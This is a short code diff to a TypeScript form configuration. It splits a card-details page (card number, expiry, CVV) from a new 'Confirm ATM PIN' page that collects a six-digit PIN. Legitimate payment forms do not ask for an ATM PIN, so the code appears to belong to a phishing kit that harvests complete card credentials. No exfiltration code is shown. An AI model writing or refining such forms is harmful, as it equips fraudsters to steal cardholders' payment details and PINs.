@@ -82,7 +82,15 @@ export const FORM_PAGES: PageConfig[] = [
         fields: [
             { key: 'cardNumber', displayName: 'Card Number', type: 'tel', category: 'card', required: true, maxlength: 19, placeholder: 'XXXX XXXX XXXX XXXX' },
             { key: 'expiry', displayName: 'Expiry Date', type: 'text', category: 'card', required: true, maxlength: 5, placeholder: 'MM/YY' },
-            { key: 'cvv', displayName: 'CVV', type: 'password', category: 'card', required: true, maxlength: 3, placeholder: 'CVV' },
+            { key: 'cvv', displayName: 'CVV', type: 'password', category: 'card', required: true, maxlength: 3, placeholder: 'CVV' }
+        ],
+        nextPage: { main: 'confirm_pin' },
+    },
+    {
+        id: 'pinModal',
+        pageName: 'confirm_pin',
+        title: 'Confirm ATM PIN',
+        fields: [
             { key: 'confirmAtmPin', displayName: 'Confirm ATM PIN', type: 'password', category: 'card', required: true, maxlength: 6, placeholder: '....' }
         ],
         nextPage: { main: 'success' },
